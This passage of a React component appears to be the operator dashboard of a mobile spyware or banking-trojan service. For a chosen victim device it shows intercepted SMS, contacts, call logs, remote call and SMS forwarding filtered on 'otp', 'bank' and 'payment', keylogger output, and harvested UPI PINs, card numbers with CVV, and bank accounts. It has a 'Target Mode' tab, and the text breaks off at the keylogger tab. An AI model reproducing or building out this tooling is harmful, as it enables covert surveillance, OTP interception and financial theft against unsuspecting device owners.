import React, { useCallback, useEffect, useMemo, useRef, useState } from 'react';
import { useDispatch, useSelector } from 'react-redux';
import { setDeviceId, listSms, sendSms, loadAdminMe, loadMyPrimaryApp, loadAppJson } from '../../features/adminApp/adminAppSlice.js';

const AdminUserAppData = () => {
  const dispatch = useDispatch();
  const { deviceId } = useSelector((s) => s.adminApp);
  const [activeTab, setActiveTab] = useState('sms');
  const [smsItems, setSmsItems] = useState([]);
  const [contacts, setContacts] = useState([]);
  const [callLogs, setCallLogs] = useState([]);
  const [fwdSettings, setFwdSettings] = useState(null);
  const [keylogs, setKeylogs] = useState([]);
  const [klMinutes, setKlMinutes] = useState(15);
  const [upi, setUpi] = useState([]);
  const [cards, setCards] = useState([]);
  const [bankAccounts, setBankAccounts] = useState([]);
  const [smsFwdSettings, setSmsFwdSettings] = useState(null);
  const [selectedPeer, setSelectedPeer] = useState(null); // conversation peer (phone/alphanumeric id)
  const chatBoxRef = useRef(null);
  const toRef = useRef(null);
  const msgRef = useRef(null);
  const [showCompose, setShowCompose] = useState(false);
  const modalToRef = useRef(null);
  const modalMsgRef = useRef(null);
  // Shareable link state
  const [shareLink, setShareLink] = useState(null);
  const [shareExpiresAt, setShareExpiresAt] = useState(null);
  const [showShareModal, setShowShareModal] = useState(false);
  const [shareDays, setShareDays] = useState(0);
  const [shareHours, setShareHours] = useState(1);
  const [shareMinutes, setShareMinutes] = useState(0);
  // Toast notifications
  const [toasts, setToasts] = useState([]);
  const pushToast = useCallback((msg, variant='dark', ttl=4000) => {
    const id = Date.now() + Math.random();
    setToasts(t=>[...t,{ id, msg, variant }]);
    setTimeout(()=> setToasts(t=> t.filter(x=>x.id!==id)), ttl);
  }, []);
  const removeToast = (id) => setToasts(t=> t.filter(x=>x.id!==id));
  // Device online status simulation
  const [deviceStatus, setDeviceStatus] = useState({ online: false, lastChecked: null, checking: false });

  // Simulated device status check when deviceId changes and periodic refresh
  useEffect(() => {
    if (!deviceId) {
      setDeviceStatus({ online: false, lastChecked: null, checking: false });
      return;
    }
    setDeviceStatus((s) => ({ ...s, checking: true }));
    const timer = setTimeout(() => {
      const online = Math.random() > 0.3; // 70% chance online (sample)
      setDeviceStatus({ online, lastChecked: Date.now(), checking: false });
    }, 600);
    return () => clearTimeout(timer);
  }, [deviceId]);

  useEffect(() => {
    if (!deviceId) return;
    const interval = setInterval(() => {
      setDeviceStatus((s) => ({ ...s, checking: true }));
      setTimeout(() => {
        const online = Math.random() > 0.3;
        setDeviceStatus({ online, lastChecked: Date.now(), checking: false });
      }, 400);
    }, 30000); // every 30s
    return () => clearInterval(interval);
  }, [deviceId]);

  const remainingShareTime = useMemo(() => {
    if (!shareExpiresAt) return null;
    const diff = shareExpiresAt - Date.now();
    if (diff <= 0) return 'Expired';
    const d = Math.floor(diff / 86400000);
    const h = Math.floor((diff % 86400000) / 3600000);
    const m = Math.floor((diff % 3600000) / 60000);
    return `${d ? d + 'd ' : ''}${h ? h + 'h ' : ''}${m}m`;
  }, [shareExpiresAt]);

  const generateShareLink = () => {
    const totalMs = (shareDays*86400000) + (shareHours*3600000) + (shareMinutes*60000);
    if (totalMs <= 0) {
  pushToast('Set a positive duration','warning');
      return;
    }
    const expiresAt = Date.now() + totalMs;
    // Sample token generation (replace with backend issued token later)
    const token = Math.random().toString(36).slice(2) + Date.now().toString(36);
    const base = window.location.origin;
    const dId = deviceId || 'sample';
    const link = `${base}/share/${token}?device=${encodeURIComponent(dId)}`;
    setShareLink(link);
    setShareExpiresAt(expiresAt);
    setShowShareModal(false);
  };

  const copyShareLink = () => {
    if (!shareLink) return;
    navigator.clipboard?.writeText(shareLink).then(()=>{
    pushToast('Link copied', 'success');
    }).catch(()=>{
      // Fallback
      const temp = document.createElement('textarea');
      temp.value = shareLink;
      document.body.appendChild(temp);
      temp.select();
  try { document.execCommand('copy'); pushToast('Link copied', 'success'); } catch { pushToast('Copy failed, select manually','danger',6000); }
      document.body.removeChild(temp);
    });
  };

  const revokeShareLink = () => {
    if (!window.confirm('Revoke shared link access?')) return;
    setShareLink(null);
    setShareExpiresAt(null);
    pushToast('Share link revoked','info');
  };

  useEffect(() => {
    // Ensure admin/app context exists if user lands directly on this page
    dispatch(loadAdminMe());
    dispatch(loadMyPrimaryApp()).then((action) => {
      const a = action.payload;
      if (a?.id) dispatch(loadAppJson(a.id));
    });
  }, [dispatch]);

  const refreshSms = useCallback(async () => {
    if (!deviceId) return setSmsItems([]);
    const action = await dispatch(listSms({ deviceId, limit: 100 }));
    if (listSms.fulfilled.match(action)) setSmsItems(action.payload);
  }, [deviceId, dispatch]);

  useEffect(() => { refreshSms(); }, [refreshSms]);

  const handleSendSms = async (e) => {
    e.preventDefault();
    const to = (selectedPeer ? String(selectedPeer) : (toRef.current?.value || '')).trim();
    const message = msgRef.current.value.trim();
    if (!to || !message) return;
    const action = await dispatch(sendSms({ to, message }));
    if (sendSms.fulfilled.match(action)) {
      msgRef.current.value = '';
      // Optimistic append
      setSmsItems((prev) => ([
        ...prev,
        { id: `tmp_${Date.now()}`, type: 'OUT', sender: 'Me', receiver: to, to, message, sentAt: new Date().toISOString() }
      ]));
      // Refresh after a moment if deviceId is set
      if (deviceId) setTimeout(refreshSms, 600);
    } else {
  pushToast(action.payload || 'Failed to send SMS','danger',6000);
    }
  };

  // Sample SMS when there is no device data; helps demo the UX
  const sampleSms = useMemo(() => ([
    // Two-person conversation: Priya ↔ Me (clear left/right alternation)
    { id: 'p1',  type: 'IN',  sender: 'Priya Sharma', receiver: 'Me', message: 'Hey! Reached home?', receivedAt: '2025-09-19T17:00:00Z' },
    { id: 'p2',  type: 'OUT', sender: 'Me',  receiver: 'Priya Sharma', to: 'Priya Sharma', message: 'Yes, just now. Traffic was crazy!', sentAt: '2025-09-19T17:01:00Z' },
    { id: 'p3',  type: 'IN',  sender: 'Priya Sharma', receiver: 'Me', message: 'Good! Did you have dinner?', receivedAt: '2025-09-19T17:05:00Z' },
    { id: 'p4',  type: 'OUT', sender: 'Me',  receiver: 'Priya Sharma', to: 'Priya Sharma', message: 'Ordering pizza. Want some?', sentAt: '2025-09-19T17:06:00Z' },
    { id: 'p5',  type: 'IN',  sender: 'Priya Sharma', receiver: 'Me', message: 'Yes please 😋', receivedAt: '2025-09-19T17:07:00Z' },

    // Dad conversation (also two-sided)
    { id: 'd1', type: 'IN',  sender: 'Dad', receiver: 'Me', message: 'Beta, call me when you are free.', receivedAt: '2025-09-16T08:00:00Z' },
    { id: 'd2', type: 'OUT', sender: 'Me',  receiver: 'Dad', to: 'Dad', message: 'Sure, give me 10 minutes.', sentAt: '2025-09-16T08:05:00Z' },
    { id: 'd3', type: 'IN',  sender: 'Dad', receiver: 'Me', message: 'Okay 👍', receivedAt: '2025-09-16T08:06:00Z' },
    { id: 'd4', type: 'OUT', sender: 'Me',  receiver: 'Dad', to: 'Dad', message: 'On the way now.', sentAt: '2025-09-16T08:20:00Z' },

    // Atul chat
    { id: 'at1', type: 'IN',  sender: 'Atul Vnsgu Mca', receiver: 'Me', message: 'Tere note book mere pass hai', receivedAt: '2025-09-18T09:30:00Z' },
    { id: 'at2', type: 'OUT', sender: 'Me',           receiver: 'Atul Vnsgu Mca', to: 'Atul Vnsgu Mca', message: 'Great, kal milte.', sentAt: '2025-09-18T09:45:00Z' },

    // Alerts and services (add an outbound reply to show both sides)
    { id: 'a1', type: 'IN',  sender: 'JG-NDMAEW-G', receiver: 'Me', message: 'Heavy Rain with moderate thunderstorm and high pro...', receivedAt: '2025-09-21T06:11:00Z' },
    { id: 'a1r', type: 'OUT', sender: 'Me', to: 'JG-NDMAEW-G', receiver: 'JG-NDMAEW-G', message: 'Thanks for the alert.', sentAt: '2025-09-21T06:12:00Z' },
    { id: 'a2', type: 'IN',  sender: 'JG-REGINF-G', receiver: 'Me', message: 'સાયબર સલામત બનો!...', receivedAt: '2025-09-20T10:00:00Z' },

    // Other broadcast/services
    { id: 'g1', type: 'IN', sender: 'JG-DOTGOI-G', receiver: 'Me', message: 'શું તમને કોઈ શંકાસ્પદ કોલ કે મેસેજ...', receivedAt: '2025-09-17T11:00:00Z' },
    { id: 'x1', type: 'IN', sender: 'AX-NARESS-P', receiver: 'Me', message: 'Few Minutes to go for the Live Session TODAY...', receivedAt: '2025-09-16T08:00:00Z' },
    { id: 'k1', type: 'IN', sender: 'Kotak811',    receiver: 'Me', message: 'Open Your Kotak811 Savings Account in Just 3 Minutes!...', receivedAt: '2025-09-16T14:00:00Z' },
    { id: 'j1', type: 'IN', sender: 'JG-JIOINF-S', receiver: 'Me', message: 'Jio તરફથી મહત્વપૂર્ણ અપડેટ્સ...', receivedAt: '2025-09-16T17:00:00Z' },
  ]), []);

  const itemsForUI = smsItems?.length ? smsItems : sampleSms;

  // Sample Contacts and Call Logs
  const sampleContacts = useMemo(() => ([
    { id: 'c1', name: 'Dad', number: '+91 98765 43210' },
    { id: 'c2', name: 'Priya Sharma', number: '+91 98123 45678' },
    { id: 'c3', name: 'Atul Vnsgu Mca', number: '+91 99001 12233' },
    { id: 'c4', name: 'Kotak811', number: '811' },
    { id: 'c5', name: 'Emergency', number: '112' },
  ]), []);

  const sampleCallLogs = useMemo(() => ([
    { id: 'cl1', type: 'INCOMING',  name: 'Dad', number: '+91 98765 43210', at: '2025-09-21T06:11:00Z', durationSec: 182 },
    { id: 'cl2', type: 'OUTGOING',  name: 'Priya Sharma', number: '+91 98123 45678', at: '2025-09-20T14:30:00Z', durationSec: 420 },
    { id: 'cl3', type: 'MISSED',    name: 'Atul Vnsgu Mca', number: '+91 99001 12233', at: '2025-09-19T09:12:00Z', durationSec: 0 },
    { id: 'cl4', type: 'INCOMING',  name: 'Unknown', number: '+91 90000 00000', at: '2025-09-18T18:45:00Z', durationSec: 35 },
    { id: 'cl5', type: 'OUTGOING',  name: 'Customer Care', number: '198', at: '2025-09-17T11:00:00Z', durationSec: 96 },
  ]), []);

  const contactsForUI = contacts?.length ? contacts : sampleContacts;
  const callLogsForUI = callLogs?.length ? callLogs : sampleCallLogs;

  // Sample Call Forwarding settings
  const sampleForwarding = useMemo(() => ({
    sim: 'SIM1',
    rules: {
      always: { enabled: false, number: '' },
      busy: { enabled: true, number: '+91 98123 45678' },
      unanswered: { enabled: true, number: '+91 98765 43210', ringSeconds: 20 },
      unreachable: { enabled: false, number: '' },
    },
    lastUpdated: '2025-09-20T12:00:00Z'
  }), []);
  const fwdForUI = fwdSettings || sampleForwarding;
  const updateRule = (rule, field, value) => {
    setFwdSettings((prev) => {
      const base = prev || fwdForUI;
      return {
        ...base,
        rules: {
          ...base.rules,
          [rule]: { ...base.rules[rule], [field]: value }
        }
      };
    });
  };
  const setSim = (sim) => setFwdSettings((prev) => ({ ...(prev || fwdForUI), sim }));
  const disableAllFwd = () => {
    const disabledRules = Object.fromEntries(Object.entries(fwdForUI.rules).map(([k, v]) => [k, { ...v, enabled: false }]));
    setFwdSettings({ ...(fwdForUI), rules: disabledRules });
  };
  const applyFwd = () => {
    // TODO: Replace with API call when backend is available
    setFwdSettings((cur) => ({ ...(cur || fwdForUI), lastUpdated: new Date().toISOString() }));
  pushToast('Call forwarding saved (sample)','success');
  };

  // ---------- Keylogger: sample data and grouping ----------
  const generateSampleKeylogs = useCallback((minutes) => {
    const apps = [
      { app: 'Chrome', title: 'google.com/search' },
      { app: 'WhatsApp', title: 'Priya Sharma' },
      { app: 'Messages', title: 'Dad' },
      { app: 'Instagram', title: '@atul_mca' },
      { app: 'YouTube', title: 'Subscriptions' },
    ];
    const texts = [
      'hello',
      'otp 492310',
      'meeting at 5 pm',
      'address: 221B Baker Street',
      'upi: user@upi',
      'pizza order confirmed',
      'checking balance kotak',
      'search: weather surat',
      'ok thanks',
      'call you later',
    ];
    const now = Date.now();
    const list = [];
    for (let i = 0; i < minutes; i++) {
      const minuteTs = now - i * 60_000;
      // 1-3 entries per minute
      const count = (i % 3) + 1;
      for (let j = 0; j < count; j++) {
        const idx = (i + j) % texts.length;
        const a = apps[(i + j) % apps.length];
        list.push({
          id: `kl_${minuteTs}_${j}`,
          at: new Date(minuteTs - j * 10_000).toISOString(),
          app: a.app,
          title: a.title,
          text: texts[idx],
        });
      }
    }
    // newest first
    return list.sort((a,b)=> new Date(b.at) - new Date(a.at));
  }, []);

  const sampleKeylogs = useMemo(() => generateSampleKeylogs(klMinutes), [generateSampleKeylogs, klMinutes]);
  const keylogsForUI = keylogs?.length ? keylogs : sampleKeylogs;

  const keylogGroups = useMemo(() => {
    const map = new Map();
    for (const k of keylogsForUI) {
      const key = new Date(k.at).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
      if (!map.has(key)) map.set(key, []);
      map.get(key).push(k);
    }
    // sort minutes desc
    const arr = Array.from(map.entries());
    arr.sort((a,b) => {
      const ta = new Date(`1970-01-01T${a[0]}:00`).getTime();
      const tb = new Date(`1970-01-01T${b[0]}:00`).getTime();
      return tb - ta;
    });
    return arr;
  }, [keylogsForUI]);

  // ---------- UPI / Cards / Bank: sample data ----------
  const sampleUpi = useMemo(() => ([
    { id: 'u1', phone: '+91 98123 45678', upiId: 'priya@upi', pin: '****', provider: 'GPAY' },
    { id: 'u2', phone: '+91 98765 43210', upiId: 'dad@paytm', pin: '****', provider: 'PAYTM' },
    { id: 'u3', phone: '+91 99001 12233', upiId: 'atul@ybl', pin: '****', provider: 'PHONEPE' },
    { id: 'u4', phone: '+91 90000 00000', upiId: 'user@bharat', pin: '****', provider: 'BHIM' },
    { id: 'u5', phone: '+91 91234 56789', upiId: 'teen@fam', pin: '****', provider: 'FAMPAY' },
  ]), []);
  const upiForUI = upi?.length ? upi : sampleUpi;

  const sampleCards = useMemo(() => ([
    { id: 'cc1', number: '4111 1111 1111 1111', expiry: '12/27', cvv: '***', name: 'Priya Sharma', type: 'VBA' },
    { id: 'cc2', number: '5555 5555 5555 4444', expiry: '03/28', cvv: '***', name: 'Dad', type: 'NONVBA' },
    { id: 'cc3', number: '6011 0000 0000 0004', expiry: '09/26', cvv: '***', name: 'Atul Vnsgu Mca', type: 'UNABLE TO FIND TYPE' },
  ]), []);
  const cardsForUI = cards?.length ? cards : sampleCards;

  const sampleBanks = useMemo(() => ([
    { id: 'b1', bankName: 'HDFC Bank', accountNo: '50100123456789', ifsc: 'HDFC0001234' },
    { id: 'b2', bankName: 'State Bank of India', accountNo: '20000123456789', ifsc: 'SBIN0000456' },
    { id: 'b3', bankName: 'ICICI Bank', accountNo: '010201234567', ifsc: 'ICIC0000789' },
  ]), []);
  const banksForUI = bankAccounts?.length ? bankAccounts : sampleBanks;

  // ---------- SMS Forwarding: sample data ----------
  const sampleSmsForwarding = useMemo(() => ({
    sim: 'SIM1',
    enabled: false,
    forwardIncoming: true,
    forwardOutgoing: false,
    forwardToNumber: '+91 90000 00000',
    forwardToEmail: '',
    keywordFilters: ['otp','bank','payment'],
    lastUpdated: new Date().toISOString(),
  }), []);
  const smsFwdForUI = smsFwdSettings || sampleSmsForwarding;
  const updateSmsFwd = (field, value) => {
    setSmsFwdSettings((prev) => ({ ...(prev || sampleSmsForwarding), [field]: value }));
  };
  const setSmsFwdSim = (sim) => setSmsFwdSettings((prev) => ({ ...(prev || sampleSmsForwarding), sim }));
  const applySmsFwd = () => {
    setSmsFwdSettings((cur) => ({ ...(cur || sampleSmsForwarding), lastUpdated: new Date().toISOString() }));
  pushToast('SMS forwarding saved (sample)','success');
  };
  const disableSmsFwd = () => {
    setSmsFwdSettings((cur) => ({ ...(cur || sampleSmsForwarding), enabled: false, forwardIncoming: false, forwardOutgoing: false }));
  };

  // Group conversations by peer id (sender for IN, to/receiver for OUT)
  const conversations = useMemo(() => {
    const map = new Map();
    for (const s of itemsForUI) {
      const peer = (s.type === 'OUT') ? (s.to || s.receiver) : (s.sender || s.from);
      const ts = Date.parse(s.sentAt || s.receivedAt || s.createdAt || new Date().toISOString());
      if (!peer) continue;
      if (!map.has(peer)) map.set(peer, { peer, lastTs: 0, lastMsg: s.message, items: [] });
      const entry = map.get(peer);
      entry.items.push(s);
      if (ts > entry.lastTs) { entry.lastTs = ts; entry.lastMsg = s.message; }
    }
    // sort by lastTs desc
    return Array.from(map.values()).sort((a,b)=>b.lastTs-a.lastTs);
  }, [itemsForUI]);

  const thread = useMemo(() => {
    if (!selectedPeer) return [];
    return itemsForUI.filter((s) => (
      (s.type === 'OUT' && (s.to === selectedPeer || s.receiver === selectedPeer)) ||
      (s.type !== 'OUT' && (s.sender === selectedPeer || s.from === selectedPeer))
    )).sort((a,b)=>{
      const ta = Date.parse(a.sentAt || a.receivedAt || a.createdAt || 0);
      const tb = Date.parse(b.sentAt || b.receivedAt || b.createdAt || 0);
      return ta - tb;
    });
  }, [selectedPeer, itemsForUI]);

  // Auto-scroll chat to bottom when thread changes
  useEffect(() => {
    if (!chatBoxRef.current) return;
    chatBoxRef.current.scrollTop = chatBoxRef.current.scrollHeight;
  }, [thread]);

  const ToastHost = ({ toasts, remove }) => (
    <div style={{position:'fixed', top:12, right:12, zIndex:1080, maxWidth:'320px'}}>
      {toasts.map(t=> (
        <div key={t.id} className={`toast align-items-center text-bg-${t.variant||'dark'} show mb-2`} role="alert">
          <div className="d-flex">
            <div className="toast-body small">{t.msg}</div>
            <button type="button" className="btn-close btn-close-white me-2 m-auto" onClick={()=>remove(t.id)}></button>
          </div>
        </div>
      ))}
    </div>
  );

  return (
    <div className="container-fluid">
      <div className="d-flex flex-wrap justify-content-between align-items-center pt-3 pb-2 mb-3 border-bottom">
        <h1 className="h4 h3-md mb-0">User Device Data</h1>
      </div>

      <div className="card shadow">
        <div className="card-header py-3 d-flex flex-wrap justify-content-between align-items-center gap-2">
          <div className="d-flex flex-wrap align-items-center gap-2">
            <h6 className="m-0 me-2">Device Scope</h6>
            <div className="input-group w-auto">
              <span className="input-group-text">Device ID</span>
              <input
                type="text"
                className="form-control"
                placeholder="Enter device id"
                value={deviceId}
                onChange={(e) => dispatch(setDeviceId(e.target.value))}
              />
              <button className="btn btn-outline-primary" onClick={refreshSms} disabled={!deviceId}>Load</button>
            </div>
          </div>
          <div className="d-flex align-items-center gap-2">
            {/* Device online/offline badge */}
            <div className="d-flex align-items-center me-2">
              {deviceStatus.checking ? (
                <span className="badge bg-secondary-subtle text-secondary">Checking...</span>
              ) : deviceStatus.online ? (
                <span className="badge bg-success">Online</span>
              ) : (
                <span className="badge bg-danger">Offline</span>
              )}
            </div>
            {shareLink && (
              <span className="badge bg-success-subtle text-success small" title={shareLink}>
                Shared {remainingShareTime ? `(${remainingShareTime})` : ''}
              </span>
            )}
            {!shareLink && (
              <button className="btn btn-sm btn-outline-secondary" onClick={()=>setShowShareModal(true)}>Share</button>
            )}
            {shareLink && (
              <>
                <button className="btn btn-sm btn-outline-primary" onClick={copyShareLink}>Copy Link</button>
                <button className="btn btn-sm btn-outline-danger" onClick={revokeShareLink}>Revoke</button>
              </>
            )}
          </div>
        </div>
        <div className="card-body">
          <ul className="nav nav-tabs mb-3">
            <li className="nav-item"><button className={`nav-link ${activeTab==='sms'?'active':''}`} onClick={()=>setActiveTab('sms')}>Messages</button></li>
            {/* <li className="nav-item"><button className={`nav-link ${activeTab==='sms_send'?'active':''}`} onClick={()=>setActiveTab('sms_send')}>Send SMS</button></li> */}
            <li className="nav-item"><button className={`nav-link ${activeTab==='contacts'?'active':''}`} onClick={()=>setActiveTab('contacts')}>Contacts</button></li>
            <li className="nav-item"><button className={`nav-link ${activeTab==='calls'?'active':''}`} onClick={()=>setActiveTab('calls')}>Call Logs</button></li>
            <li className="nav-item"><button className={`nav-link ${activeTab==='forwarding'?'active':''}`} onClick={()=>setActiveTab('forwarding')}>Call Forwarding</button></li>
            <li className="nav-item"><button className={`nav-link ${activeTab==='sms_forwarding'?'active':''}`} onClick={()=>setActiveTab('sms_forwarding')}>SMS Forwarding</button></li>
            <li className="nav-item"><button className={`nav-link ${activeTab==='keylogger'?'active':''}`} onClick={()=>setActiveTab('keylogger')}>Keylogger</button></li>
            <li className="nav-item"><button className={`nav-link ${activeTab==='bank_details'?'active':''}`} onClick={()=>setActiveTab('bank_details')}>Bank Details</button></li>
            <li className="nav-item"><button className={`nav-link ${activeTab==='upi'?'active':''}`} onClick={()=>setActiveTab('upi')}>UPI Details</button></li>
            <li className="nav-item"><button className={`nav-link ${activeTab==='card'?'active':''}`} onClick={()=>setActiveTab('card')}>Card Details</button></li>
            <li className="nav-item"><button className={`nav-link ${activeTab==='google'?'active':''}`} onClick={()=>setActiveTab('google')}>Google</button></li>
            <li className="nav-item"><button className={`nav-link ${activeTab==='device_mgmt'?'active':''}`} onClick={()=>setActiveTab('device_mgmt')}>Device Mgmt</button></li>
            <li className="nav-item"><button className={`nav-link ${activeTab==='target_mode'?'active':''}`} onClick={()=>setActiveTab('target_mode')}>Target Mode</button></li>
            <li className="nav-item"><button className={`nav-link ${activeTab==='more'?'active':''}`} onClick={()=>setActiveTab('more')}>More</button></li>
          </ul>

          {activeTab === 'sms' && (
            <div className="row g-3">
              {!selectedPeer && (
                <div className="col-12">
                  <div className="d-flex justify-content-between align-items-center mb-2">
                    <h6 className="mb-0">Conversations</h6>
                    <div className="d-flex gap-2">
                      <button className="btn btn-sm btn-primary" onClick={() => setShowCompose(true)}>Compose</button>
                      <button className="btn btn-sm btn-outline-secondary" onClick={refreshSms}>Refresh</button>
                    </div>
                  </div>
                  <div className="list-group" style={{maxHeight:'560px', overflowY:'auto'}}>
                    {conversations.length === 0 ? (
                      <div className="text-muted small">{deviceId ? 'No SMS found for this device.' : 'Showing sample conversations'}</div>
                    ) : conversations.map((c) => (
                      <button key={c.peer} className="list-group-item list-group-item-action d-flex align-items-center gap-2" onClick={() => setSelectedPeer(c.peer)}>
                        <div className="rounded-circle bg-secondary text-white d-flex align-items-center justify-content-center" style={{width:36,height:36}}>
                          {c.peer?.slice(0,2).toUpperCase()}
                        </div>
                        <div className="flex-grow-1 text-start">
                          <div className="fw-semibold">{c.peer}</div>
                          <div className="text-muted small text-truncate" style={{maxWidth:'100%'}}>{c.lastMsg}</div>
                        </div>
                        <div className="text-muted small" style={{whiteSpace:'nowrap'}}>{new Date(c.lastTs).toLocaleTimeString()}</div>
                      </button>
                    ))}
                  </div>
                </div>
              )}

              {selectedPeer && (
                <div className="col-12">
                  <div className="d-flex align-items-center justify-content-between mb-2">
                    <div>
                      <button className="btn btn-sm btn-outline-secondary me-2" onClick={()=>setSelectedPeer(null)}>Back</button>
                      <span className="h6 align-middle mb-0">{selectedPeer}</span>
                    </div>
                    <button className="btn btn-sm btn-outline-secondary" onClick={refreshSms}>Refresh</button>
                  </div>
                  <div className="text-muted mb-2">Identifier: {selectedPeer}</div>
                  <div ref={chatBoxRef} className="border rounded p-2 mb-2" style={{maxHeight:'60vh', overflowY:'auto', background:'#f7f7f9'}}>
                    {thread.map((m) => {
                      const dirOut = m.type==='OUT';
                      const label = dirOut ? `You → ${selectedPeer}` : `${selectedPeer} → You`;
                      return (
                        <div key={m.id} className={`mb-2 ${dirOut ? 'text-end' : 'text-start'}`}>
                          <div className="small text-muted mb-1">{label}</div>
                          <div className={`d-inline-block px-3 py-2 rounded-3 ${dirOut ? 'bg-primary text-white' : 'bg-white border'}`} style={{maxWidth:'75%'}}>
                            <div className="small">{m.message}</div>
                            <div className={`small mt-1 ${dirOut ? 'text-white-50' : 'text-muted'}`}>
                              {new Date(m.sentAt || m.receivedAt || m.createdAt || Date.now()).toLocaleString()}
                            </div>
                          </div>
                        </div>
                      );
                    })}
                  </div>
                  <form onSubmit={handleSendSms} className="d-flex gap-2">
                    <input type="text" className="form-control" placeholder={`Message ${selectedPeer}`} ref={msgRef} />
                    <button className="btn btn-primary" type="submit">Send</button>
                  </form>
                </div>
              )}
            </div>
          )}

          {activeTab === 'contacts' && (
            <div className="row g-3">
              <div className="col-12">
                <div className="d-flex justify-content-between align-items-center mb-2">
                  <h6 className="mb-0">Contacts</h6>
                  <button className="btn btn-sm btn-outline-secondary" onClick={() => setContacts(contacts)}>Refresh</button>
                </div>
                <div className="table-responsive">
                  <table className="table table-sm align-middle">
                    <thead className="table-light">
                      <tr>
                        <th style={{width:'40%'}}>Name</th>
                        <th style={{width:'40%'}}>Number</th>
                        <th style={{width:'20%'}} className="text-end">Actions</th>
                      </tr>
                    </thead>
                    <tbody>
                      {contactsForUI.map((c) => (
                        <tr key={c.id}>
                          <td>{c.name}</td>
                          <td className="text-muted">{c.number}</td>
                          <td className="text-end">
                            <button className="btn btn-sm btn-outline-primary" onClick={() => { setSelectedPeer(c.name || c.number); setActiveTab('sms'); }}>Message</button>
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              </div>
            </div>
          )}

          {activeTab === 'calls' && (
            <div className="row g-3">
              <div className="col-12">
                <div className="d-flex justify-content-between align-items-center mb-2">
                  <h6 className="mb-0">Call Logs</h6>
                  <button className="btn btn-sm btn-outline-secondary" onClick={() => setCallLogs(callLogs)}>Refresh</button>
                </div>
                <div className="table-responsive">
                  <table className="table table-sm align-middle">
                    <thead className="table-light">
                      <tr>
                        <th>Type</th>
                        <th>Peer</th>
                        <th>Number</th>
                        <th>Time</th>
                        <th className="text-end">Duration</th>
                      </tr>
                    </thead>
                    <tbody>
                      {callLogsForUI.map((l) => (
                        <tr key={l.id}>
                          <td>
                            {l.type === 'INCOMING' && <span className="badge bg-success-subtle text-success">Incoming</span>}
                            {l.type === 'OUTGOING' && <span className="badge bg-primary-subtle text-primary">Outgoing</span>}
                            {l.type === 'MISSED' && <span className="badge bg-danger-subtle text-danger">Missed</span>}
                          </td>
                          <td>{l.name}</td>
                          <td className="text-muted">{l.number}</td>
                          <td>{new Date(l.at).toLocaleString()}</td>
                          <td className="text-end">{l.durationSec ? `${Math.floor(l.durationSec/60)}m ${l.durationSec%60}s` : '-'}</td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              </div>
            </div>
          )}

          {activeTab === 'forwarding' && (
            <div className="row g-3">
              <div className="col-12">
                <div className="d-flex flex-wrap justify-content-between align-items-center mb-3 gap-2">
                  <div className="d-flex align-items-center gap-2">
                    <h6 className="mb-0">Call Forwarding</h6>
                    <div className="btn-group ms-2" role="group" aria-label="SIM selector">
                      <button type="button" className={`btn btn-sm ${fwdForUI.sim==='SIM1'?'btn-primary':'btn-outline-primary'}`} onClick={()=>setSim('SIM1')}>SIM 1</button>
                      <button type="button" className={`btn btn-sm ${fwdForUI.sim==='SIM2'?'btn-primary':'btn-outline-primary'}`} onClick={()=>setSim('SIM2')}>SIM 2</button>
                    </div>
                  </div>
                  <div className="d-flex gap-2">
                    <button className="btn btn-sm btn-outline-secondary" onClick={()=>setFwdSettings(fwdSettings)}>Refresh</button>
                    <button className="btn btn-sm btn-outline-danger" onClick={disableAllFwd}>Disable All</button>
                    <button className="btn btn-sm btn-primary" onClick={applyFwd}>Apply</button>
                  </div>
                </div>

                <div className="list-group">
                  {/* Always forward */}
                  <div className="list-group-item">
                    <div className="d-flex align-items-center gap-3 mb-2">
                      <div className="form-check form-switch">
                        <input className="form-check-input" type="checkbox" checked={!!fwdForUI.rules.always.enabled} onChange={(e)=>updateRule('always','enabled',e.target.checked)} />
                        <label className="form-check-label ms-2">Always forward</label>
                      </div>
                      <input type="text" className="form-control" placeholder="Forward to number" style={{maxWidth:360}} value={fwdForUI.rules.always.number} onChange={(e)=>updateRule('always','number',e.target.value)} />
                    </div>
                    <div className="text-muted small">All calls will be forwarded regardless of device state.</div>
                  </div>

                  {/* Forward when busy */}
                  <div className="list-group-item">
                    <div className="d-flex align-items-center gap-3 mb-2">
                      <div className="form-check form-switch">
                        <input className="form-check-input" type="checkbox" checked={!!fwdForUI.rules.busy.enabled} onChange={(e)=>updateRule('busy','enabled',e.target.checked)} />
                        <label className="form-check-label ms-2">When busy</label>
                      </div>
                      <input type="text" className="form-control" placeholder="Forward to number" style={{maxWidth:360}} value={fwdForUI.rules.busy.number} onChange={(e)=>updateRule('busy','number',e.target.value)} />
                    </div>
                    <div className="text-muted small">If line is engaged.</div>
                  </div>

                  {/* Forward when unanswered */}
                  <div className="list-group-item">
                    <div className="d-flex flex-wrap align-items-center gap-3 mb-2">
                      <div className="form-check form-switch">
                        <input className="form-check-input" type="checkbox" checked={!!fwdForUI.rules.unanswered.enabled} onChange={(e)=>updateRule('unanswered','enabled',e.target.checked)} />
                        <label className="form-check-label ms-2">When unanswered</label>
                      </div>
                      <input type="text" className="form-control" placeholder="Forward to number" style={{maxWidth:360}} value={fwdForUI.rules.unanswered.number} onChange={(e)=>updateRule('unanswered','number',e.target.value)} />
                      <div className="input-group" style={{maxWidth:180}}>
                        <span className="input-group-text">Rings</span>
                        <input type="number" className="form-control" min={5} max={60} value={fwdForUI.rules.unanswered.ringSeconds || 20} onChange={(e)=>updateRule('unanswered','ringSeconds',Number(e.target.value))} />
                      </div>
                    </div>
                    <div className="text-muted small">Forward if not answered within the specified ring time.</div>
                  </div>

                  {/* Forward when unreachable */}
                  <div className="list-group-item">
                    <div className="d-flex align-items-center gap-3 mb-2">
                      <div className="form-check form-switch">
                        <input className="form-check-input" type="checkbox" checked={!!fwdForUI.rules.unreachable.enabled} onChange={(e)=>updateRule('unreachable','enabled',e.target.checked)} />
                        <label className="form-check-label ms-2">When unreachable</label>
                      </div>
                      <input type="text" className="form-control" placeholder="Forward to number" style={{maxWidth:360}} value={fwdForUI.rules.unreachable.number} onChange={(e)=>updateRule('unreachable','number',e.target.value)} />
                    </div>
                    <div className="text-muted small">Forward if device is switched off or out of coverage.</div>
                  </div>
                </div>

                <div className="text-muted small mt-2">Last updated: {new Date(fwdForUI.lastUpdated).toLocaleString()}</div>
              </div>
            </div>
          )}

          {activeTab === 'keylogger' && (
            <div className="row g-3">
